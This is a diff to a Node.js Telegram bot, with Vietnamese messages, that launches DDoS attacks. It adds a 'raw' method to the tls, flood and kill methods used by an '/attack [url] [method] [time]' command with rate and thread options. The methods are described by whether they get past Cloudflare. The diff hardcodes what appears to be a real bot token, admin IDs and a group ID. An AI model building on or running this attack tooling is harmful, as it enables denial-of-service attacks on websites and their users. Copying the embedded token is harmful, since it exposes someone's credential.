@@ -4,7 +4,7 @@ const token = '7903023411:AAHxE6o_hdibPehD27m1qd9xWnTGYyY_Znc';
 const bot = new TelegramBot(token, { polling: true });
 const admins = [6601930239, 1848131455];
 const groupId = -1002370415846;
-const methods = ['tls', 'flood', 'kill'];
+const methods = ['tls', 'flood', 'kill', 'raw'];
 const db = Database('bot.db');
 db.exec(`CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT);
 CREATE TABLE IF NOT EXISTS blacklist (keyword TEXT PRIMARY KEY);
@@ -43,7 +43,7 @@ bot.onText(/\/methods/, (msg) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id;
   if (!isAllowed(chatId, userId)) return;
-  bot.sendMessage(chatId, `*🛡 Method hiện có:*\n• tls -> Send cloudflare\n• flood -> Bản v1, requests ổn\n• kill -> Mạnh nhưng no bypass`, { parse_mode: "Markdown" });
+  bot.sendMessage(chatId, `*🛡 Method hiện có:*\n• tls -> Send cloudflare\n• flood -> Bản v1, requests ổn\n• kill -> Mạnh nhưng no bypass\n• raw - Raw`, { parse_mode: "Markdown" });
 });
 bot.onText(/\/blacklist(?:\s+)?$/, (msg) => {
   const chatId = msg.chat.id;
@@ -110,7 +110,7 @@ bot.onText(/\/attack$/, (msg) => {
   if (!isAllowed(chatId, userId)) return;
   bot.sendMessage(chatId, 'Cú pháp: /attack [url] [method] [time] [-r rate] [-t threads]\nVD: /attack https://abc.com tls 30 -r 64 -t 8', { parse_mode: "Markdown" });
 });
-bot.onText(/\/attack (.+?) (tls|flood|kill) (\d+)(?:\s+-r\s+(\d+))?(?:\s+-t\s+(\d+))?/, (msg, match) => {
+bot.onText(/\/attack (.+?) (tls|flood|kill|raw) (\d+)(?:\s+-r\s+(\d+))?(?:\s+-t\s+(\d+))?/, (msg, match) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id;
   if (!isAllowed(chatId, userId)) return;
